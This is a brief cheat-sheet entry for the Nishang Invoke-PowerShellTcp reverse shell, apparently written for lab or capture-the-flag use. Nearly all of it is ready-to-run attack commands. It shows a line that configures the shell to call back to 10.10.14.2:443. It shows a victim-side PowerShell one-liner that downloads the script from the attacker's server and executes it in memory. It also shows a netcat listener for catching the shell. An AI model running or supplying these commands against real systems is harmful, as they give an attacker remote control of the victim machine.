# Name
Nishang Invoke-PowerShellTcp.ps1

## Usage
```
# Add to last line
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443

# On Victim
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1'))"

# On Attacker
nc -lvp 443
```

## Source
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

